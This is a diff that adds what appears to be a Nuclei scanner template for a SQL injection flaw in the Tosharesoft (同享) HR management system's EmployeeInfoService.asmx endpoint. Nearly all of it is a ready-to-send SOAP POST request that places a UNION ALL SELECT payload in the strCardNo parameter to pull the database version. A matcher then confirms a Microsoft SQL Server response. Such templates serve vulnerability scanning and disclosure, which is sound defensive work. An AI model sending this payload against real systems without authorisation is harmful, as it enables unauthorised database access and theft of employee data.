@@ -1,0 +1,44 @@
+id: tosharesoft-EmployeeInfoService-sqli
+info:
+  name: 同享人力资源管理系统 /Service/EmployeeInfoService.asmx SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 同享人力资源管理系统存在SQL注入漏洞，该漏洞位于接口/Service/EmployeeInfoService.asmx的GetEmployeeByCardNo方法中。攻击者可以通过构造恶意的SQL语句注入到strCardNo参数中，获取数据库中的敏感信息，如数据库版本、用户信息等。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/em06ph8d4gw2hgg8
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: tosharesoft,sqli
+
+http:
+  - raw:
+      - |
+        POST /Service/EmployeeInfoService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Content-Length: 535
+        Content-Type: text/xml; charset=utf-8
+        Cookie: 
+        Soapaction: "http://tempuri.org/GetEmployeeByCardNo"
+        Accept-Encoding: gzip
+
+        <?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetEmployeeByCardNo xmlns="http://tempuri.org/">
+              <strCardNo>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCardNo>
+            </GetEmployeeByCardNo>
+          </soap:Body>
+        </soap:Envelope> </soap:Envelope>
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
